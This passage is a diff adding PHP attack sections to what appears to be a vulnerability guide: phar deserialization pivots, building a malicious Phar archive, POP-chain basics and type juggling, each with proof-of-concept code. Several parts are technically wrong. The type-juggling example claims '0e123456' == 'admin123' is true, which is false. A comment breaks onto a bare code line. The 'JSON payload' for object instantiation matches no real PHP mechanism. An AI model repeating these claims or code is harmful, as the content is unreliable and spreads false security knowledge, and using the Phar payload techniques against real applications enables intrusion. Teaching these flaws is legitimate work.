@@ -164,3 +164,136 @@ Explanation:
 
 - Send a crafted request to trigger object instantiation with the malicious payload, potentially leading to code execution.
 
+### 7) Pivot Primitives
+
+The vulnerability revolves around exploiting a deserialization vulnerability in PHP applications, specifically leveraging a class with a vulnerable __construct method.
+This allows an attacker to instantiate objects with malicious payloads, leading to arbitrary code execution
+
+#### PoC
+
+      <?php
+      // Crafting a malicious object with a vulnerable __construct method
+      class Bar {
+      public function __construct($name) {
+      file_get_contents($name); // Sink for file operation
+       }
+      }
+      // Triggering object instantiation with a crafted payload
+      $payload = '{"Bar": {"name": "phar://path/to/malicious.phar"}}';
+      // Send a request to trigger object instantiation with the crafted payload
+      ?>
+
+Explanation:
+
+- Craft a PHP class with a vulnerable __construct method, allowing file operations with arbitrary file paths.
+
+- Construct a payload specifying the class name and constructor arguments, pointing to a malicious Phar archive.
+
+- Trigger object instantiation by sending a request with the crafted payload, potentially leading to arbitrary code execution.
+
+### 8) Generate a Malicious Phar
+
+The vulnerability stems from a deserialization issue in PHP applications, particularly involving the crafting of malicious Phar (PHP Archive) files. By exploiting vulnerable classes with magic methods such as __destruct and manipulating controlled data, attackers can achieve arbitrary code execution.
+
+#### PoC
+
+      <?php
+      // Malicious class with a vulnerable __destruct method
+      class FileCookieJar {
+      public function __destruct() {
+      $this->save($this->filename); // Vulnerable code path
+      }
+      // Function to save cookies to a file
+      public function save($filename) {
+      // Process cookies and save to file
+       }
+      }
+      // Generating a malicious Phar payload
+      $phar = new Phar('malicious.phar');
+      $phar->startBuffering();
+      $phar->setStub('<?php __HALT_COMPILER(); ?>');
+      // Add a malicious object of FileCookieJar class as metadata
+      $object = new FileCookieJar;
+      $object->filename = "path/to/malicious.php";
+      $phar->setMetadata($object);
+      $phar->stopBuffering();
+      ?>
+
+Explanation:
+
+- Craft a PHP class ( FileCookieJar ) with a vulnerable __destruct method, allowing file operations with controlled file paths.
+
+- Generate a malicious Phar archive containing the crafted object of the vulnerable class.
+
+- Set the metadata of the Phar archive to the malicious object, specifying the filename for potential exploitation.
+
+- The Phar archive can be used to trigger object deserialization and execute arbitrary code via the vulnerable __destruct method.
+
+### 9) Technique for POP chain development
+
+The vulnerability lies in deserialization issues in PHP applications, allowing attackers to execute arbitrary code by manipulating serialized objects. By crafting malicious serialized payloads, attackers can exploit vulnerable classes with magic methods like __construct and __destruct to achieve code execution.
+
+#### PoC
+
+      <?php
+      // Vulnerable class with __construct and __destruct methods
+      class SourceIncite {
+      private $data;
+      public function __construct($data){
+      $this->data = $data;
+      }
+      public function __destruct(){
+      echo $this->data."\r\n";
+       }
+      }
+      // Serialized payload with controlled data property
+      $serialized = 'O:12:"SourceIncite":1:{s:4:"data";s:4:"test";}';
+      // Deserialize the payload
+      var_dump(unserialize($serialized));
+      ?>
+
+Explanation:
+
+- Define a vulnerable PHP class ( SourceIncite ) with __construct and __destruct methods.
+
+- Craft a serialized payload setting a controlled data property ( data ) to exploit the class.
+
+- Deserialize the payload to trigger the execution of the __destruct method and print the controlled data.
+
+### 10) Type Juggling
+
+Type juggling vulnerabilities arise due to the loose comparison operators in PHP, such as == and != . These operators perform type coercion, allowing different data types to be compared. However, this can lead to unexpected behavior when comparing variables of different types. Attackers can exploit this behavior to bypass authentication, perform unauthorized actions, or manipulate data.
+
+#### PoC
+
+      <?php
+      // Vulnerable authentication function
+      function authenticate($user_input) {
+      $expected_password = 'admin123';
+      return $user_input == $expected_password;
+      }
+      // Attacker-supplied password
+      $attacker_password = '0e123456'; // A string starting with '0e'
+      coerces to float 0 when compared
+      // Attempt authentication with attacker-supplied password
+      $is_authenticated = authenticate($attacker_password);
+      // Check authentication result
+      if ($is_authenticated) {
+      echo "Authentication successful";
+      } else {
+      echo "Authentication failed";
+      }
+      ?>
+
+Explanation:
+
+- Define a vulnerable authentication function authenticate that compares user-supplied password with the expected password using loose comparison operator == .
+
+- Attacker supplies a password ( $attacker_password ) starting with '0e', which coerces to float 0 when compared.
+
+- Attempt authentication with attacker-supplied password.
+
+- Due to type juggling vulnerability, the comparison evaluates to true, allowing the attacker to bypass authentication.
+
+### 11) Time of Check Time of Use (TOCTOU)
+
